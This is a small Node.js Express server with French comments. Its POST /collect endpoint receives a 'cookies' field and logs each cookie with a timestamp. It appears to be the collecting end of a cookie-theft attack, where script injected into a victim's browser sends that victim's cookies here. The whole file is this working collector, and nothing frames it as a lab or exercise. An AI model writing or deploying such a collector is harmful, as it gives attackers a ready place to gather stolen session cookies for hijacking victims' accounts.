const express = require("express");
const app = express();

app.use(express.json());

app.post("/collect", (req, res) => {
  const now = new Date(); // date et heure actuelles
  console.log("\n===============================");
  console.log(`📅 Date / Heure de réception : ${now.toLocaleString()}`);
  console.log("===============================");
  
  const cookies = req.body.cookies;
  if (!cookies) {
    console.log("Aucun cookie reçu !");
  } else {
    // Séparer chaque cookie sur une nouvelle ligne pour plus de lisibilité
    cookies.split("; ").forEach((c, i) => {
      console.log(`Cookie ${i + 1}: ${c}`);
    });
  }
  
  console.log("===============================\n");
  res.json({ status: "ok" });
});

app.get("/", (req, res) => {
  res.send("Le serveur fonctionne !");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
